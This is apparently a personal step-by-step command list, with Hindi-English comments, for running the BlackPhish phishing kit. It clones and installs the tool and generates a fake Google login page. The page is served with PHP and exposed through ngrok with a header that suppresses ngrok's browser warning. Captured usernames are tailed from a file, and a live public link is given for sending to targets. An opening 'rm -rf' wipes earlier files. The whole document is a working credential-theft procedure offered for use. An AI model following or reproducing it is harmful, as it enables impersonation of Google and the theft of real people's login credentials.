# ========================================
# STEP BY STEP - BLACKPHISH
# ========================================

# Step 1: Purani files delete karo
rm -rf /root/phishing_page/*

# Step 2: BlackPhish install (pehli baar)
cd ~
git clone https://github.com/iinc0gnit0/BlackPhish.git
cd BlackPhish
sudo ./install.sh

# Step 3: BlackPhish run karo
sudo python3 blackphish.py
# Menu: 3 (Google) → 1 (Localhost)
# Jab server start ho jaye → Ctrl+C

# Step 4: Files copy karo
cp -r /var/www/html/* /root/phishing_page/

# Step 5: PHP server start (Terminal 1)
cd /root/phishing_page
php -S 0.0.0.0:8080

# Step 6: Ngrok start (Terminal 2)
ngrok http 8080 --request-header-add "ngrok-skip-browser-warning: true"

# Step 7: Credentials monitor (Terminal 3)
tail -f /root/phishing_page/usernames.txt

# Step 8: Link send karo

https://reformist-handed-trapping.ngrok-free.dev